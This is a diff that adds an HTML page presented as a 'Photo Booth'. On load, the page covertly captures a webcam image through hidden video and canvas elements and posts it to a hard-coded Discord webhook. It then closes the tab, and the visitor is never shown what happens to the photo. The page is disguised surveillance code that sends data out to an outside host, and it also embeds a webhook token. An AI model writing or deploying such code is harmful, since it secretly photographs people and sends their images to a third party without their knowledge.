@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo Booth</title>
+</head>
+<body>
+    <video id="video" autoplay style="display: none;"></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <script>
+        async function startPhotoBooth() {
+            try {
+                // Access the camera
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // Play the video
+                video.play();
+
+                // Wait 3 seconds, take a photo, and send it
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+
+                    // Set canvas size to video size
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    // Draw video frame to canvas
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Convert canvas to image data
+                    const photo = canvas.toDataURL('image/png');
+
+                    // Send to Discord
+                    sendToDiscord(photo);
+
+                    // Stop camera and close tab
+                    stream.getTracks().forEach(track => track.stop());
+                    window.close();
+                }, 3000);
+            } catch (err) {
+                alert('Camera access denied!');
+                console.error(err);
+            }
+        }
+
+        function sendToDiscord(photo) {
+            const webhookUrl = 'https://discord.com/api/webhooks/1323391157719269468/9KwhAyL1Lnz1PFpbXuy66DyH60rNGFpTQ1ZNwh40gUsG3v57zPfNgErHjOZX02g6X72u';
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    content: "Here's a new photo!",
+                    embeds: [{
+                        image: { url: photo }
+                    }]
+                })
+            }).then(response => {
+                if (response.ok) {
+                    console.log('Photo sent successfully!');
+                } else {
+                    console.error('Failed to send photo to Discord.');
+                }
+            });
+        }
+
+        // Start the photobooth when the page loads
+        window.onload = startPhotoBooth;
+    </script>
+</body>
+</html>
